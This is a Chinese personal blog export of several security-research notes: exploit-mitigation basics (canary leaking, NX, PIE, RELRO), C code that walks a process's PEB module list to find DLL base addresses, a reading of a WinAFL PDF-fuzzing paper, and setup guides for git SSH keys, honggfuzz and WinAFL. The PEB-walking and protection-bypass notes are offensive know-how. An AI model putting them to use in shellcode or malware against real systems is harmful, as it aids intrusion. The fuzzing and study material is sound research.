泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。 常用格式化字符串或者是 fork函数的单字节爆破两种方式进行泄露 FORTIFY 这个保护基本没法绕，这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。 加了这个保护（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets, memcpy, printf等等会被替换成read_chk, fgets_chk, memcpy_chk,printf_chk等带_chk后缀的函数。 NX 经典的堆栈不可执行保护，No-execute保护。将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。和windows下的DEP原理相同。 说是堆栈不可执行，实际上是整个 数据页面上都不行，这时jmp-shellcode的方式就不行了，就到了最传统的return-to-libc的攻击方式。 PIE 内存空间随机化保护，position-independent executable。在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。通过扰乱获取固定的地址定位来保护程序。-no-pie参数来开启关闭。 影响的是绝对地址，但是相对偏移不变。 RELRO read only relocation。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。这种防范方式是对延迟绑定攻击的一种防护。 二、API地址定位 api在dll库里，api相对于dll基地址的偏移是不变的. Base address 过程 1、通过FS寄存器定位到线程环境块TEB结构体。（64-bit用的是GS寄存器）。 2、在TEB结构体中找到PEB结构体（32，64位不同） 3、通过PEB结构体找到指向 PEB_LDR_DATA 结构体的指针，存放着已经被进程装载的动态链接库的信息。 InLoadOrderModuleList; //模块加载顺序 InMemoryOrderModuleList; //模块在内存中的顺序 InInitializationOrderModuleList; //模块初始化装载顺序 4、在上述结构体中找到模块初始化链表的头指针 InInitializationOrderModuleList 5、看到链表的结构也比较简单 6、模块初始化链表 InInitializationOrderModuleList 中按顺序存放着 PE 装入运行时初始化模块的信息。 ​ 第一个链表结点是 ntdll.dll，第二个是kernelbase.dll，第三个链表结点就是 kernel32.dll。 7、找到属于 kernel32.dll 的结点后，在其基础上再偏移 0x08 就是 kernel32.dll 在内存中的加载基地址。 这是因为，kernel32这占据8字节。 8、从 kernel32.dll 的加载基址算起，偏移 0x3C 的地方就是其 PE 头，这个是通过静态分析得到的，pe文件结构 9、PE 头偏移 0x78 的地方存放着指向函数导出表的指针。 流程图 实现代码 获取到LDR之后，这个双链表指向进程装载的模块，结构中的每个指针，指向了一个LDR_DATA_TABLE_ENTRY 的结构（The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure ）InMemoryOrderModuleList含进程的已加载模块的多维链接列表的头 可以看到这样的一个双向链表。这样就可以获得 LDR_DATA_TABLE_ENTRY 结构体的基本结构了 typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID Reserved3[2]; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; #pragma warning(push) #pragma warning(disable: 4201) // we'll always use the Microsoft compiler union { ULONG CheckSum; PVOID Reserved6; } DUMMYUNIONNAME; #pragma warning(pop) ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 可以利用上面的结构体查找dll的基地址。关键还是节点的遍历。 #include #include #include #include #include typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { PWSTR ModuleName[10]; DWORD64 ModuleAddr[10]; DWORD ProcID = 29616; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcID); HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); PPEB_LDR_DATA ldrr = peb.Ldr; PLIST_ENTRY pListEntry = ldrr->InMemoryOrderModuleList.Flink; int i = 0; int j = 0; while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); ModuleAddr[i] = (DWORD64)pEntry->DllBase; ModuleName[i] = pEntry->FullDllName.Buffer; pListEntry = pListEntry->Flink; i++; } for (j = 0; j \", ModuleName[j]); printf(\"%I64p\\n\", ModuleAddr[j]); } printf(\"finish\\n\"); CloseHandle(hProcess); return 0; } 上述代码实现了利用InMemoryOrderModuleList链表。访问导入模块基地址的功能，同时也可以访问模块的名称字符串。 一般的程序显示的导入模块顺序是： [++] Loaded DLL: {C:\\Users\\Rootkit\\Desktop\\dll [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\ntdll.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\System32\\KERNEL32.DLL} base address: [++] Loaded DLL: {C:\\WINDOWS\\System32\\KERNELBASE.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\VCRUNTIME140D.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\ucrtbased.dll} base address: 先是自己的路径，遇到中文会截断，然后是一些系统dll。 缺点 只能访问到当前载入的dll，不因为dll基本是动态载入的，所以访问到的比较少，同时对于loadlibrary访问的dll也是无法获取到的。 Offset address 思路 1、 拿到基地址实际上就是MZ所在的地址，这时候根据PE文件结构直接定位就可以了。这里需要定位的是程序的导出表 利用结构体和ReadProcessMemory函数将内容读进结构体，就可以定位到函数的导出表 2、 直接记住偏移，基址不同，但是偏移是一定的。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 20:51:16 "},"MyArticles/Vulnerability_Mining/winafl关于pdf测试的阅读-水.html":{"url":"MyArticles/Vulnerability_Mining/winafl关于pdf测试的阅读-水.html","title":"winafl文献-关于pdf中的图片测试(极水)","keywords":"","body":"Win下测试高亮 传统的afl在unix上运行的时候，在关键地方通过是否变成绿色来判断是否测试完毕，但是在Windows上没有进行高亮，本来以为是Windows的cmd不支持ansi色彩，后来发现不是。 通过代码可以发现真正的问题出现在源码中他就没开。找到debug.h文件，在里面的42行左右可以发现一些判断，这里直接把判断去掉就可以在Windows中高亮了。别让他判断就行了，他判断了一个本地的环境是不是tty，不是就不高亮了。 #ifdef USE_COLOR # define cBLK \"\\x1b[0;30m\" # define cRED \"\\x1b[0;31m\" # define cGRN \"\\x1b[0;32m\" # define cBRN \"\\x1b[0;33m\" # define cBLU \"\\x1b[0;34m\" # define cMGN \"\\x1b[0;35m\" # define cCYA \"\\x1b[0;36m\" # define cLGR \"\\x1b[0;37m\" # define cGRA \"\\x1b[1;30m\" # define cLRD \"\\x1b[1;31m\" # define cLGN \"\\x1b[1;32m\" # define cYEL \"\\x1b[1;33m\" # define cLBL \"\\x1b[1;34m\" # define cPIN \"\\x1b[1;35m\" # define cLCY \"\\x1b[1;36m\" # define cBRI \"\\x1b[1;37m\" # define cRST \"\\x1b[0m\" # define bgBLK \"\\x1b[40m\" # define bgRED \"\\x1b[41m\" # define bgGRN \"\\x1b[42m\" # define bgBRN \"\\x1b[43m\" # define bgBLU \"\\x1b[44m\" # define bgMGN \"\\x1b[45m\" # define bgCYA \"\\x1b[46m\" # define bgLGR \"\\x1b[47m\" # define bgGRA \"\\x1b[100m\" # define bgLRD \"\\x1b[101m\" # define bgLGN \"\\x1b[102m\" # define bgYEL \"\\x1b[103m\" # define bgLBL \"\\x1b[104m\" # define bgPIN \"\\x1b[105m\" # define bgLCY \"\\x1b[106m\" # define bgBRI \"\\x1b[107m\" #else # define cBLK \"\\x1b[0;30m\" # define cRED \"\\x1b[0;31m\" # define cGRN \"\\x1b[0;32m\" # define cBRN \"\\x1b[0;33m\" # define cBLU \"\\x1b[0;34m\" # define cMGN \"\\x1b[0;35m\" # define cCYA \"\\x1b[0;36m\" # define cLGR \"\\x1b[0;37m\" # define cGRA \"\\x1b[1;30m\" # define cLRD \"\\x1b[1;31m\" # define cLGN \"\\x1b[1;32m\" # define cYEL \"\\x1b[1;33m\" # define cLBL \"\\x1b[1;34m\" # define cPIN \"\\x1b[1;35m\" # define cLCY \"\\x1b[1;36m\" # define cBRI \"\\x1b[1;37m\" # define cRST \"\\x1b[0m\" # define bgBLK \"\\x1b[40m\" # define bgRED \"\\x1b[41m\" # define bgGRN \"\\x1b[42m\" # define bgBRN \"\\x1b[43m\" # define bgBLU \"\\x1b[44m\" # define bgMGN \"\\x1b[45m\" # define bgCYA \"\\x1b[46m\" # define bgLGR \"\\x1b[47m\" # define bgGRA \"\\x1b[100m\" # define bgLRD \"\\x1b[101m\" # define bgLGN \"\\x1b[102m\" # define bgYEL \"\\x1b[103m\" # define bgLBL \"\\x1b[104m\" # define bgPIN \"\\x1b[105m\" # define bgLCY \"\\x1b[106m\" # define bgBRI \"\\x1b[107m\" // # define cBLK \"\" // # define cRED \"\" // # define cGRN \"\" // # define cBRN \"\" // # define cBLU \"\" // # define cMGN \"\" // # define cCYA \"\" // # define cLGR \"\" // # define cGRA \"\" // # define cLRD \"\" // # define cLGN \"\" // # define cYEL \"\" // # define cLBL \"\" // # define cPIN \"\" // # define cLCY \"\" // # define cBRI \"\" // # define cRST \"\" // # define bgBLK \"\" // # define bgRED \"\" // # define bgGRN \"\" // # define bgBRN \"\" // # define bgBLU \"\" // # define bgMGN \"\" // # define bgCYA \"\" // # define bgLGR \"\" // # define bgGRA \"\" // # define bgLRD \"\" // # define bgLGN \"\" // # define bgYEL \"\" // # define bgLBL \"\" // # define bgPIN \"\" // # define bgLCY \"\" // # define bgBRI \"\" #endif /* ^USE_COLOR */ /************************* * Box drawing sequences * *************************/ #ifdef FANCY_BOXES # define SET_G1 \"\\x1b)0\" /* Set G1 for box drawing */ # define RESET_G1 \"\\x1b)B\" /* Reset G1 to ASCII */ # define bSTART \"\\x0e\" /* Enter G1 drawing mode */ # define bSTOP \"\\x0f\" /* Leave G1 drawing mode */ # define bH \"q\" /* Horizontal line */ # define bV \"x\" /* Vertical line */ # define bLT \"l\" /* Left top corner */ # define bRT \"k\" /* Right top corner */ # define bLB \"m\" /* Left bottom corner */ # define bRB \"j\" /* Right bottom corner */ # define bX \"n\" /* Cross */ # define bVR \"t\" /* Vertical, branch right */ # define bVL \"u\" /* Vertical, branch left */ # define bHT \"v\" /* Horizontal, branch top */ # define bHB \"w\" /* Horizontal, branch bottom */ #else # define SET_G1 \"\" # define RESET_G1 \"\" # define bSTART \"\" # define bSTOP \"\" # define bH \"-\" # define bV \"|\" # define bLT \"+\" # define bRT \"+\" # define bLB \"+\" # define bRB \"+\" # define bX \"+\" # define bVR \"+\" # define bVL \"+\" # define bHT \"+\" # define bHB \"+\" #endif /* ^FANCY_BOXES */ /*********************** * Misc terminal codes * ***********************/ #ifdef USE_COLOR #define TERM_HOME \"\\x1b[H\" #define TERM_CLEAR TERM_HOME \"\\x1b[2J\" #define cEOL \"\\x1b[0K\" #define CURSOR_HIDE \"\\x1b[?25l\" #define CURSOR_SHOW \"\\x1b[?25h\" #else #define TERM_HOME \"\\x1b[H\" #define TERM_CLEAR TERM_HOME \"\\x1b[2J\" #define cEOL \"\\x1b[0K\" #define CURSOR_HIDE \"\\x1b[?25l\" #define CURSOR_SHOW \"\\x1b[?25h\" // #define TERM_HOME \"\" // #define TERM_CLEAR \"\" // #define cEOL \"\" // #define CURSOR_HIDE \"\" // #define CURSOR_SHOW \"\" #endif /* ^USE_COLORS */ 优化winafl发现pdf阅读器的漏洞 针对pdf阅读器中的图片解析引擎提出了一种针对性的方案来减少winafl的盲目性。翻译学习的是一篇期刊论文 《Optimizing WinAFL for Image Parsing Engine Vulnerability Discovery in PDF Readers》 疑惑 这个论文开篇就解答了“为什么关于pdf解析器的漏洞很多？”的问题，因为pdf格式复杂，并不像docx或者txt或者md那种格式单一的文档，正因为结构的复杂性所以导致了漏洞的多样性。 fuzz分类 基于生成的 需要测试人员提供程序的格式化信息或者其他标识，好帮助更好的fuzz过程 基于变异的 不需要规定输入的格式，程序会根据预定义的变异规则进行随机变异，winafl则是基于变异的fuzzer。 DynamoRIO winafl的关键就是DynamoRIO这个黑盒的模糊测试工具中的drrun.exe,这个工具可以通过动态插桩来对二进制程序进行动态分析程序的执行过程，还可以进行污点分析的功能。ida安装一个灯塔插件就可以配合使用了。可以将其理解为一个进程虚拟机，结构图如下： 该工具也是通过基本块的定义来监视程序执行的。 AFL afl作为fuzz模糊测试的一种具体实现形式，他利用遗传算法和编译时检测以发现被测程序内部的覆盖信息，并将有意义的样本进行记录从而变化模糊的策略以此来达到更好的测试效果，流程如图所示 使用 afl-cmin 对原始种子文件进行语料提取，并根据路径反馈消除重复文件。主要用于初始文件多的情况。生成的文件集被添加到种子文件队列中。 根据种子选择算法从种子队列中选择首选种子集。 根据预设的变化选择种子文件。 使用多种变异算法对文件进行变异，可以周期性地生成大量测试用例进行测试。 一般对afl的修改都是对变异策略的修改，以此来达到更高覆盖率的目的。 如果程序崩溃被触发，可能存在潜在的漏洞，存储触发崩溃的文件并记录崩溃。 如果找到一个新的路径，将该路径的测试用例添加到种子队列中。 当这个种子生成的所有测试用例都被测试后，继续从第3步开始，以此类推。 winafl介绍 afl一般用于unix环境中，处于代码的差异和接口的差异，Windows平台并不能使用上述提到的编译时检测的方式，而是使用winafl(模糊测试+记录)+dynamoRIO(动态插桩)的组合进行测试。RIO可以动态的通过管道通信的方式将覆盖率反馈给winafl。 流程 afl_fuzz.exe 通过创建命名管道(不是匿名管道)和内存映射与目标进程进行交互。管道用于发送和接收命令，与其他进程进行交互，内存映射主要用于记录覆盖信息。 覆盖率记录主要是通过 drmgr_register_BB_uments_event 来设置 BB 执行的回调函数。覆盖率由 Instrent_bb_overage 或 Instrent_edge_overage 记录，如果找到新的执行路径，则将样本放入队列目录中，以进行后续的文件变异，从而提高代码覆盖率。 在目标进程执行到目标函数(target_offset或者target_modules参数规定的地址或者名称)之后，pre_fuzz_handler 将被调用来存储上下文信息，包括寄存器和运行参数。 在目标函数启动后，post_fuzz_handle 函数将被调用来记录应答上下文信息（ reply context information），从而执行原始目标函数并返回到第二步。 当目标函数的运行次数达到指定的循环调用次数时，进程将被中断并退出。 PDF文件格式 pdf是由一组相互连接的对象按照层次结构构造的，基本上计算机里的所有文件都是按照这种层级模式构架的吧😅 基本由这四个结构体构成。 header 开头一般是以%PDF-开始的，后面跟一个数字，代表着pdf代表着版本规范号。 Body 正文由多个间接对象组成，主要用来存储pdf的内容，同时标记图片的一些特点和文字的一些特征。pdf会对这些内容进行压缩来控制文件大小。 xref 交叉引用，相当于PE文件里的节区头的作用，记录了每个对象相对于文档起始位置的偏移（byte为单位） trailer 以trailer开始，以%%EOF结束，预告片存储两个重要的信息片段： 由属性关键字Root标识的根对象，以及交叉引用表相对于文档开头的字节偏移位置，由关键字startxref标识。 WinAFL改进 主要对winafl中的write_to_testcase进行重写劫持来达到对pdf中的图像部分的变异。 write_to_testcase 这个函数的作用是生成根据变异和遗传算法生成后续用来测试的案例文件。这里拿到的论文介绍和我实际上拿到的项目中的代码有出入啊，下文是winafl中的afl_fuzz.c的中的函数代码，这些代码的作用就是生产测试文件，测试文件名称一般是 “Cur_input”文件，这个文件一般存放到in目录中。 static void write_to_testcase(void* mem, u32 len) { if (dll_write_to_testcase_ptr) { dll_write_to_testcase_ptr(out_file, out_fd, mem, len); return; } else if (use_sample_shared_memory) { //this writes fuzzed data to shared memory, so that it is available to harnes program. uint32_t* size_ptr = (uint32_t*)shm_sample; unsigned char* data_ptr = shm_sample + 4; if (len > MAX_SAMPLE_SIZE) len = MAX_SAMPLE_SIZE; *size_ptr = len; memcpy(data_ptr, mem, len); return; } s32 fd = out_fd; if (out_file) { fd = open(out_file, O_WRONLY | O_BINARY | O_CREAT | O_TRUNC, DEFAULT_PERMISSION); if (fd run_target 之后通过“run_target”函数来启动执行测试程序，并且将“Cur_input”文件输入进去 static u8 run_target(char** argv, u32 timeout) { total_execs++; if (dll_run_target_ptr) { return dll_run_target_ptr(argv, timeout, trace_bits, MAP_SIZE); } #ifdef INTELPT if (use_intelpt) { return run_target_pt(argv, timeout); } #endif //todo watchdog timer to detect hangs DWORD num_read, dwThreadId; char result = 0; if (sinkhole_stds && devnul_handle == INVALID_HANDLE_VALUE) { devnul_handle = CreateFile( \"nul\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (devnul_handle == INVALID_HANDLE_VALUE) { PFATAL(\"Unable to open the nul device.\"); } } if (dll_init_ptr) { if (!dll_init_ptr()) PFATAL(\"User-defined custom initialization routine returned 0\"); } if (!is_child_running()) { destroy_target_process(0); create_target_process(argv); fuzz_iterations_current = 0; } if (dll_run_ptr) process_test_case_into_dll(fuzz_iterations_current); child_timed_out = 0; memset(trace_bits, 0, MAP_SIZE); MemoryBarrier(); if (fuzz_iterations_current == 0 && init_tmout != 0) { watchdog_timeout_time = get_cur_time() + init_tmout; } else { watchdog_timeout_time = get_cur_time() + timeout; } watchdog_enabled = 1; result = ReadCommandFromPipe(timeout); if (result == 'K') { //a workaround for first cycle in app persistent mode result = ReadCommandFromPipe(timeout); } if (result == 0) { //saves us from getting stuck in corner case. MemoryBarrier(); watchdog_enabled = 0; destroy_target_process(0); return FAULT_TMOUT; } if (result != 'P') { FATAL(\"Unexpected result from pipe! expected 'P', instead received '%c'\\n\", result); } WriteCommandToPipe('F'); result = ReadCommandFromPipe(timeout); //no need to check for \"error(0)\" since we are exiting anyway //ACTF(\"result: '%c'\", result); MemoryBarrier(); watchdog_enabled = 0; #ifdef _WIN64 classify_counts((u64*)trace_bits); #else classify_counts((u32*)trace_bits); #endif /* ^_WIN64 */ fuzz_iterations_current++; if (fuzz_iterations_current == fuzz_iterations_max) { destroy_target_process(2000); } if (result == 'K') return FAULT_NONE; if (result == 'C') { ret_exception_code = ReadDWORDFromPipe(timeout); // ACTF(\"destroying target process\"); destroy_target_process(2000); return FAULT_CRASH; } destroy_target_process(0); return FAULT_TMOUT; } 算法框架 一般来说当fuzz PDF的时候，一般就是拿PDF文件作为种子文件进行后续的变异。该文中为了针对性的fuzz PDF李的图片部分，所以种子文件被替换为图像格式。实现的思路就是： 劫持write_to_testcase函数，用来替换直接输入二进制流到.cur_input文件的原始操作。将该函数劫持之后，用自定义的脚本来测试用例，这样就可以写入磁盘的每一个测试案例都是一个经过变异之后的图片。 然后调用run_target函数来嵌入的PDF文件输入到目标程序中。论文中的图片如图： 这个改动的本质就是，不动PDF的整体结构，只对PDF中的图片进行变异，通过这种方式来提高测试的效率和减少系统开支。 总结 论文的最后采用C和python混合变异的方式来修改程序，通过案例测试发现相比于之前的效率显著提高，但是文章里没有给出具体的代码。在论文中提到，还可以通过修改对PDF中的otf或者ttf等格式的图片进行测试。 本文相当于是通过这篇论文来从代码层面对winafl有了一个大概的认识，他的主要代码就集中在afl-fuzz.c和debug.h这两个文件中。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-15 20:53:04 "},"MyArticles/ToolUsage.html":{"url":"MyArticles/ToolUsage.html","title":"Tool usage","keywords":"","body":"工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:47 "},"MyArticles/ToolUsage/多git公钥配置.html":{"url":"MyArticles/ToolUsage/多git公钥配置.html","title":"自定义git公钥配置-常见问题","keywords":"","body":"目前我需要用到的git环境主要有： jnctf的gitlab github - drootkit github-crootkit github-hellorootkit 这四个账户，其中常用的 是gitlab和drootkit，一个用来提交内部项目，另一个用来更新博客，为了方便起见，需要在本地配置多个git公钥环境。 请注意 为了配置多个git的公钥环境，需要先下载git相关组件。请在下面的网页下载正版git： Git - Downloading Package (git-scm.com) 下载之后进行安装即可，然后创建C:\\Users\\users\\.ssh目录，用来存放会用到的公钥和私钥文件。 注意1 使用命令ssh-keygen -t rsa -f id_rsa_my生成密钥和公钥，一般会有一个-C email的参数，这个是为了添加备注，有没有都行，csdn常见的命令格式是ssh-keygen -t rsa -C #########@*mail.com -f ：这个目的是可以选在将公钥私钥放在什么位置叫什么名称 该参数其实可以不加，因为在第二部就会叫你选择： 为了方便起见，我见你每一个都去命名，而不是新的覆盖旧的，这事傻逼的行为。 注意2 csdn一般会让你去设置一个global命令设置全局的用户名和邮箱，这一步是可以跳过的，因为他不重要而且会在意想不到的地方报错。如果你开始设置了，请使用命令： $ git config --global --unset user.name \"你的名字\" $ git config --global --unset user.email \"你的邮箱\" 来取消掉你的设置，当然如果你就一个hub或者lab之类的那就无所谓了。总结：不要进行设置 注意3 在上述进行的注意1中，后面会让你输入密码，这个可以直接回车表示忽略，但是为了安全起见可以设置一个常用的密码，但是请你记住他。 结合上述三个注意，你会得到这样的一个生成过程： 这样就可以在.ssh目录中生成了两个文件，带有.pub的是公钥文件，另一个是私钥文件。 注意4 - 容易报错的 如果你重命名了你的公钥或者私钥文件，那么在你进行clone或者push的时候会出现让你输入密码的情况；或者是clone是失败的情况。 出现报错是正常的，这时你就需要配置一下git安装目录里的ssh_config文件： 将你的私钥在这里写上，并取消这一行的注释。然后保存，这时你就可以正常的使用git了。 多密钥的config配置 上述提到了我有很多的git仓库，我可以都用一个公钥，也可以针对不同的网站配置不同的公钥。 ssh_config配置 和上面的一样，新增一行就好了 经过测试发现是可以的，成功拉去了lab中的项目。 姓名-邮箱 config配置 这时有多个密钥，配置config的目的是在提交的时候，让内容知道自己要往哪里走，去哪个仓库。当然一般情况下是需要先git clone一下的，但是这里不考虑这种情况。 config文件没有后缀名，所以先用txt编辑好之后删除后缀就行了。 然后保存一下，提交的时候改一下就行了。 但是在使用commit的时候会出现： 这是因为没有设置名字和邮箱，但是又不想去进行global设置，所以这里进入该项目的git目录下，然后找到config文件，在后面加入如下内容： 这样就可以直接提交了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 21:49:13 "},"MyArticles/ToolUsage/HonggFuzz使用-入门.html":{"url":"MyArticles/ToolUsage/HonggFuzz使用-入门.html","title":"honggfuzz使用-安装","keywords":"","body":"这个fuzz工具简单，但是可能会有一些奇怪的问题。 下载 不要直接clone他github里的项目，那个有bug，而且是语法错误压根就没法编译 而是下载他release版本里的source code进行编译。我用的是这个版本 下载之后直接linux下编译，官方文档说支持Windows，但是我Windows实在是没成功，有成功的大佬能分享一下经验嘛 ,我的邮箱 然后根据他官方文档的教程直接编译就行了 过程 进入honggfuzz目录 ，然后直接make，遇到什么报错就装什么库，需要提前进行一些准备 apt update apt upgrade apt install gcc apt install clang 在make之前先进行一个关键的操作，进Makefile，把一个傻逼的参数改了😅 这个会把警告变成报错 第一个错误 通过 apt install libunwind8-dev 可以解决上述问题 第二个问题 这就是缺少bfd库，完事 apt install libbfd-dev 最后 make clean，make，sudo make install 在install的时候可以最后一步也会出问题，但是我发现不影响使用。 有这个文件就差不多了，可以执行它看看参数，就差不多可以用了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-27 21:32:34 "},"MyArticles/ToolUsage/WinAFL使用-入门.html":{"url":"MyArticles/ToolUsage/WinAFL使用-入门.html","title":"WinAFL 使用","keywords":"","body":"WinAFL 因为winafl需要的测试时间比较长，所以目前采取的策略： 本地的win10虚拟机环境配置，命令配置，样本收集，成功跑起环境的时候推送到服务器上进行长时间测试（操作相同配置、或者直接推送到服务器上） 环境 win10专业版，但是认证过期了 安装WinAFL 安装DynamoRIO（新+旧，注意选对仓库，右边的那个仓库） cmake 3.190，高版本问题也不大，别太低就行 Visual Studio 2019（c++环境） 过程 需要提前安装好Visual Studio 2019（c++环境）和perl环境还有doxygen。最好提前安装好，配置好环境变量（或者在make里面当时添加）。 编译DynamoRIO 这个是插桩库，关于fuzz中在Windows上用来插桩的关键工具，如果没有这个东西，winAFL就不能编译出winafl.dll这个关键文件。两种方式，我建议直接安装编译好的版本，关键就是里面的cmake目录。 编译AFL 不同的位数需要分开编译，用到cmake-gui，为什么呢，因为Windows下的命令行不会讲错误高亮出来，你也不知道对错，给自己埋地雷。 64 利用cmake的gui填入相关目录 这里第二个输出目录随便，没有她会自己新建。然后Configure一下，这里需要注意的是在File里有一个清理缓存的选项 Configure里面第一个就是要选择一下编译环境 第二行可以选择是32还是64位，默认是64，一般就这样就直接finish，然后下面可能会报错，缺少message compiler或者是什么其他的就everything找一下，然后把目录添加进去就行，参考这里就行。 完成之后，还需要再点击Generate，完事就去目标目录里，用vs打开sln文件 这个用vs打开，然后用vs编译就行，这里网上的教程基本都是让你用命令行，这种做法相对比较傻逼一些，给自己找麻烦。 直接生成解决方案就行，这里注意会有一个报错，但是好像不影响文件的生成。 注意项目里有没有winafl这个文件，没有的话就说明cmake失败了。 32 注意在cmake里的Configure的时候选择一下，其他步骤一致。vs编译的时候不会报错 最后 看到这样基本就成了。也可以看到目录下生成的文件。 红框中的是关键文件，其他文件都是一些测试用例和我自己写的案例。 使用例子 为了验证程序是不是能跑，先找一个命令测试一下 下面的命令需要在cmd中使用，Windows terminal里面无法执行这个命令 afl-fuzz.exe -i in -o out -D \"D:\\dynamorio-master\\dynamorio-master\\Project\\bin32\" -t 20000 -- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 -target_module test_gdiplus.exe -target_offset 0x1680 -nargs 1 -- test_gdiplus.exe @@ 需要注意的是里面的--是分隔符 -o、-i是输出输入目录 -t是超时时间，单位毫秒 coverage_module这是测试的模块，允许有多个 fuzz_iterations是循环的次数，这个会影响exec speed， 一般速度在几百上千是正常的，过慢就说明前处理过程不行 target_module和target_offset是测试的程序，就是要执行的程序，要和最后的相匹配，而且offset一定要是module里的offset，ida可以直接看 -nargs是参数的个数，不包括本身 @@代表参数是自动生成的in里的 最后的结果如下所示 AFL++ afl已经很久没有更新了，但是推出的afl++还在更新，所以可以采用afl++来替代afl。 配置这个环境很简单，直接使用docker就行了，注意设置一个共享目录用来交流文件。 docker pull aflplusplus/aflplusplus docker run -ti -v $HOME:/home aflplusplus/aflplusplus export $HOME=\"/home\" IrfanView案例 首先在官网下载最新版本，然后下载一些他的插件 在这里可以下载插件，可以看到这里还是有不少CVE版本的。 首先先找一下样本库，从github仓库中可以下载，下载之后需要对样本进行一个精简，让 afl自己去根据特征进行删减来提高效率。 寻找偏移 不论干啥都需要先找到处理文件的对应的偏移，可以使用ProcMon来查找 找到处理偏移之后，就可以用winafl自带的工具进行样本筛选 python winafl-cmin.py --working-dir C:\\Users\\moshe\\Desktop\\fuzz\\winafl\\build32\\bin\\Release -w 3 -i C:\\Users\\moshe\\Desktop\\fuzz\\samples -o C:\\Users\\moshe\\Desktop\\fuzz\\irfanview_cmin -t 4000 -D C:\\Users\\moshe\\Desktop\\fuzz\\dynamorio\\build\\bin32 -covtype edge -target_module \"i_view32.exe\" -coverage_module \"i_view32.exe\" -target_offset 0xa54fd -nargs 3 -- C:\\Users\\moshe\\Desktop\\fuzz\\iview457\\i_view32.exe @@ /convert=\"NUL\" /silent 第一个参数是winafl.dll所在的目录 -w是CPU的核心数，提高筛选速度 i/o就是输入和输出目录 -t就是超时时间 -D是DynamoRIO 目录。这与之前执行 drrun 的位置相同.exe covtype： 默认覆盖跟踪器仅跟踪遍历了哪些基本块。Edge还跟踪基本块被命中的顺序。因此，如果您的程序从具有两个独立输入的基本块 A->B->C 和 A->C->B 开始，则基本块跟踪器只会看到一个感兴趣的输入，而边缘跟踪器将同时看到两个输入。 后面就是目标模块和测试模块了 程序参数的个数 后面就是执行的时候的参数 经过筛选完之后就是这个结果 使用drrun验证 这是关键的一步，需要注意的是： 测试程序和winafl一定要在同一个目录下，不然会出现定位不到偏移的问题。比如我测试的是aaa.exe但是主要目标是他的插件bbb.dll这里bbb的位置无所谓，但是exe一定要同目录 一定要注意一定要注意一定要注意一定要注意 可以使用如下命令进行测试，这个文档不是一天写的，所以测试的程序不一样，懒得改了。 D:\\DynamoRIO9.92.19461\\bin32\\drrun.exe -c winafl.dll -debug -target_module calldll.exe - coverage_module test_call.dll -fuzz_iterations 10 -target_offset 0x1590 -- calldll.exe \"123123123456asdf\" 查看覆盖率 利用命令，生成一个log文件，然后利用ida安装的lighthouse插件，在 load生成的log file，就可以明显的看到覆盖率了，但是这里需要注意的是lighthouse已经很久没更新了，所以需要一个旧版本的drrun来测试，查看的结果其实应该基本一样的。如果报错了，就降低drrun的版本，但是编译afl的时候还是用新版本的drrun去编译。然后生成的对应的文件要load进对应文件的ida中，用错了也会报错。 D:\\DynamoRIO-Windows-8.0.18712\\bin32\\drrun.exe -t drcov -- calldll.exe adsfadfadfdasfassdf 12345609876llllllllllllllllll 总结 利用procmon实际上就是进行一个大体的定位，后续用到的drrun就是对具体模块中的代码块进行的定位，可以看到覆盖百分率这些东西，看一下目标模块怎么样就可以了，或者有没有陷入奇怪的代码中。 开始模糊测试 使用经典的winafl命令就可以直接进行测试了，因为这是利用 DynamoRIO 进行的动态插桩，所以不需要编译啥的。 